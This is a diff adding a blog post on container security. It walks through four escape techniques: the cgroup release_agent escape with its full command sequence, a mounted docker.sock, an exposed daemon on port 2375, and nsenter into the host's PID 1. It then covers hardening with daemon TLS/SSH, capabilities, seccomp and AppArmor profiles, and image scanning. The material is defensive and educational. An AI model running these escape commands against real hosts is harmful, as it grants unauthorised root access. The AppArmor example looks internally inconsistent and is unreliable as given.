@@ -1,0 +1,379 @@
+---
+title: 'Container security: escapes and hardening'
+excerpt: Four ways a misconfigured container hands you the host — and the full set of switches that lock it back down.
+date: 2024-08-15
+featured: true
+tags: [Security, Linux, Docker]
+---
+
+import { CodeBlock } from '../../components/ui'
+
+export const escapeCommands = String.raw`mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/exploit" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /exploit
+echo "cat /home/user1/flag.txt > $host_path/flag.txt" >> /exploit
+chmod a+x /exploit
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"`
+
+export const seccompProfile = String.raw`{
+  "defaultAction": "SCMP_ACT_ALLOW",
+  "architectures": [
+    "SCMP_ARCH_X86_64",
+    "SCMP_ARCH_X86",
+    "SCMP_ARCH_X32"
+  ],
+  "syscalls": [
+    { "names": [ "read", "write", "exit", "exit_group", "open", "close", "stat", "fstat", "lstat", "poll", "getdents", "munmap", "mprotect", "brk", "arch_prctl", "set_tid_address", "set_robust_list" ], "action": "SCMP_ACT_ALLOW" },
+    { "names": [ "execve", "execveat" ], "action": "SCMP_ACT_ERRNO" }
+  ]
+}`
+
+export const apparmorProfile = String.raw`/usr/sbin/httpd {
+
+capability setgid,
+capability setuid,
+
+/var/www/** r,
+/var/log/apache2/** rw,
+/etc/apache2/mime.types r,
+
+/run/apache2/apache2.pid rw,
+/run/apache2/\*.sock rw,
+
+# Network access
+
+network tcp,
+
+# System logging
+
+/dev/log w,
+
+# Allow CGI execution
+
+/usr/bin/perl ix,
+
+# Deny access to everything else
+
+/** ix,
+deny /bin/**,
+deny /lib/**,
+deny /usr/**,
+deny /sbin/\*\*
+}`
+
+Containers feel like a boundary. They aren't much of one when they're configured
+carelessly. This is my working notes on both halves of the problem: how a badly
+configured container gets you onto the host, and how to configure one so it
+doesn't.
+
+## Container vulnerabilities
+
+### Privileged containers
+
+Docker runs a container in one of two modes:
+
+- **User mode** — interacts with the host OS through the Docker Engine.
+- **Privileged** — interacts directly with the host OS.
+
+If a container runs with privileged access, commands can effectively be executed
+as root on the host. View a container's capabilities with `capsh --print`.
+
+The classic escape abuses the Linux kernel's `cgroups` release-agent mechanism.
+The kernel uses cgroups to manage processes, and cgroups can be managed as root
+on the host — so a privileged container can mount one and point its release
+handler at a script it controls. Walking through the exploit:
+
+1. Create a cgroup to work with. Because cgroups are managed as root on the host,
+   mount one to `/tmp/cgrp` in the container.
+2. Tell the kernel to run code on release — writing `1` to
+   `/tmp/cgrp/x/notify_on_release` makes the kernel execute something once the
+   cgroup finishes.
+3. Find where the container's files live on the host and store that as a
+   variable.
+4. Write the location of the exploit on the host into `release_agent`, so the
+   exploit runs when the cgroup is released.
+5. Turn the exploit into a shell on the host.
+6. Run a command — `cat /home/user1/flag.txt > $host_path/flag.txt` — to pull the
+   host file back into the container.
+7. Make the exploit executable.
+8. Add a process to `/tmp/cgrp/x/cgroup.procs`; when it's released, the contents
+   execute.
+
+<Accordion
+  items={[
+    {
+      id: 'escape-commands',
+      title: 'Commands to execute',
+      body: <CodeBlock code={escapeCommands} lang="bash" />,
+    },
+  ]}
+/>
+
+The full explanation of why this works is in Trail of Bits'
+[container escape post](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).
+
+### Escaping via an exposed Docker daemon
+
+Docker commands run over a socket. Unix sockets use filesystem permissions, so
+you have to be root or in the `docker` group to run Docker commands. That socket
+gets mounted into a container as a `docker.sock` file — search for it with
+`find` (on Ubuntu it lives under `/var/run`).
+
+If you can reach the daemon, you can ask it to create a new container with the
+host's filesystem mounted in, and step across:
+
+```bash
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+That command mounts the host filesystem to `/mnt` in a new container, runs it
+interactively with `-it`, changes the root to `/mnt`, and drops into `sh` — a
+shell on the host's files.
+
+### Remote code execution via an exposed daemon
+
+Docker can also use TCP sockets for [IPC](https://en.wikipedia.org/wiki/Inter-process_communication),
+so it can be administered remotely with tools like Portainer or Jenkins. When
+configured that way the engine listens on a port (2375 by default), which is easy
+to reach and hard to secure. Find it with nmap:
+
+```bash
+nmap -sV -p 2375 <ip_address>
+```
+
+Poke it with `curl`:
+
+```bash
+curl http://<ip_address>:2375/version
+```
+
+Then drive it with the Docker CLI's `-H` flag to target the remote host — `ps`,
+`images`, `network`, `exec`, `run` all work:
+
+```bash
+docker -H tcp://<ip_address>:2375 ps
+```
+
+### Abusing namespaces
+
+Sometimes a container shares a namespace with the host so the two can
+communicate. That can be abused with `nsenter`, which starts a process inside
+another process's namespace. If the container can see the host's `/sbin/init`
+(PID 1), you can launch a shell in its namespaces:
+
+```bash
+nsenter --target 1 --mount --uts --ipc --net /bin/bash
+```
+
+Each flag matters:
+
+1. `--target 1` aims at PID 1, the special system process, to gain root.
+2. `--mount` enters the target's mount namespace (its filesystem view).
+3. `--uts` shares the UTS namespace so the hostname matches — mismatched
+   hostnames cause connection issues.
+4. `--ipc` enters the IPC namespace, so shared memory works.
+5. `--net` enters the network namespace, so you can use the host's interfaces —
+   enough to open a stable reverse shell.
+
+`bash` then runs in the same namespaces and privileges as the kernel.
+
+## Container hardening
+
+<Callout variant="warning">
+  Privileged containers have full root access. Never reach for `--privileged`
+  when a specific capability will do.
+</Callout>
+
+### Protecting the Docker daemon
+
+Use secure communication and authentication to keep the daemon out of reach.
+
+**SSH.** Docker uses _contexts_ — think of them as profiles you can save and
+switch between for different hosts. You need SSH access to the remote host and an
+account there with permission to run Docker.
+
+```bash
+docker context create \
+  --docker host=ssh://<username>@<remotehost> \
+  --description="Development Environment" \
+  development-environment-host
+
+docker context use development-environment-host
+```
+
+**TLS.** The daemon can also be driven over HTTPS. In TLS mode it only accepts
+commands from devices whose certificates are signed against it. On the server:
+
+```bash
+dockerd --tlsverify --tlscacert=myca.pem --tlscert=myserver-cert.pem --tlskey=myserver-key.pem -H=0.0.0.0:2376
+```
+
+On the client:
+
+```bash
+docker --tlsverify --tlscacert=myca.pem --tlscert=client-cert.pem --tlskey=client-key.pem -H=<SERVER_IP>:2376 info
+```
+
+### Implementing control groups
+
+Control groups (cgroups) are a kernel feature that restricts and prioritizes how
+many system resources a process can use — good for stability and for tracking
+usage. Docker doesn't enable limits by default; set them when starting a
+container:
+
+```bash
+docker run -it --cpus="1" mycontainer
+docker run -it --memory="20m" mycontainer
+```
+
+Update a running container, and inspect it:
+
+```bash
+docker update --memory="40m" mycontainer
+docker inspect mycontainer
+```
+
+<Callout>A resource limit of `0` means no limit has been set.</Callout>
+
+### Preventing over-privileged containers
+
+Capabilities are a Linux feature that controls what a process can do at a
+granular level, so you can fine-tune privileges instead of handing over root. A
+few:
+
+- `CAP_NET_BIND_SERVICE` — bind to ports below 1024, which normally needs root.
+- `CAP_SYS_ADMIN` — a grab-bag of admin rights: mounting filesystems, changing
+  network settings, rebooting.
+- `CAP_SYS_RESOURCE` — modify resource limits.
+
+Rather than `--privileged`, drop everything and add back only what a container
+needs. This gives a web server the ability to bind low ports and nothing else:
+
+```bash
+docker run -it --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE webserver
+```
+
+Check what a process holds with `capsh --print`.
+
+### Seccomp and AppArmor
+
+Two ways to restrict what a container can do — one enforced inside the app, one
+by the OS.
+
+<Tabs
+  items={[
+    {
+      id: 'seccomp',
+      label: 'Seccomp',
+      content: (
+        <>
+          <p>
+            <strong>Seccomp</strong> restricts the system calls an application
+            can make. You write a list of rules — allow <code>read</code>, deny{' '}
+            <code>execve</code> — which shrinks what an attacker can do while
+            keeping the app working. A profile for a web server that can read
+            and write files but not execute anything:
+          </p>
+          <CodeBlock code={seccompProfile} lang="json" />
+          <p>Apply it at runtime:</p>
+          <CodeBlock
+            code="docker run --rm -it --security-opt seccomp=/path/to/profile.json mycontainer"
+            lang="bash"
+          />
+        </>
+      ),
+    },
+    {
+      id: 'apparmor',
+      label: 'AppArmor',
+      content: (
+        <>
+          <p>
+            <strong>AppArmor</strong> does something similar, but from the OS
+            side rather than inside the app — it's a Mandatory Access Control
+            system that decides what a process may do from a set of rules
+            enforced at the OS level. This profile lets an Apache container read
+            from <code>/var/www</code>, read and write its logs, bind TCP port
+            80, and nothing else:
+          </p>
+          <CodeBlock code={apparmorProfile} lang="text" />
+          <p>
+            Confirm AppArmor is installed with <code>sudo aa-status</code>, load
+            the profile, then run the container with it:
+          </p>
+          <CodeBlock
+            code={
+              'sudo apparmor_parser -r -W /path/to/profile.json\ndocker run --rm -it --security-opt apparmor=/path/to/profile.json mycontainer'
+            }
+            lang="bash"
+          />
+        </>
+      ),
+    },
+  ]}
+/>
+
+### Reviewing Docker images
+
+Analyze a Dockerfile before you trust it. [Dive](https://github.com/wagoodman/dive)
+reverse-engineers an image by inspecting what's executed and changed at each
+build layer, so you can see what actually goes in.
+
+### Compliance and benchmarking
+
+<Accordion
+  items={[
+    {
+      id: 'frameworks',
+      title: 'Compliance frameworks',
+      body: (
+        <ul>
+          <li>
+            <a href="https://csrc.nist.gov/publications/detail/sp/800-190/final">
+              NIST SP 800-190
+            </a>
+          </li>
+          <li>
+            <a href="https://www.iso.org/standard/27001">ISO 27001</a>
+          </li>
+        </ul>
+      ),
+    },
+    {
+      id: 'benchmarking',
+      title: 'Benchmarking tools',
+      body: (
+        <ul>
+          <li>
+            <a href="https://www.cisecurity.org/benchmark/docker">
+              CIS Docker Benchmark
+            </a>{' '}
+            — assesses compliance against the CIS Docker benchmark.
+          </li>
+          <li>
+            <a href="https://www.open-scap.org/">OpenSCAP</a> — assesses against
+            multiple frameworks, including CIS and NIST SP 800-190.
+          </li>
+          <li>
+            <a href="https://docs.docker.com/scout/">Docker Scout</a> — Docker's
+            own cloud service; lists image vulnerabilities and how to fix them.
+          </li>
+          <li>
+            <a href="https://github.com/anchore/grype">Grype</a> — a fast
+            vulnerability scanner for images and filesystems.
+          </li>
+        </ul>
+      ),
+    },
+  ]}
+/>
+
+```bash
+docker scout cves local://nginx:latest
+grype imagename --scope all-layers
+grype /path/to/image.tar   # a filesystem exported with `docker image save`
+```
+
+Isolation is a set of switches, not a default. Flip them on deliberately.
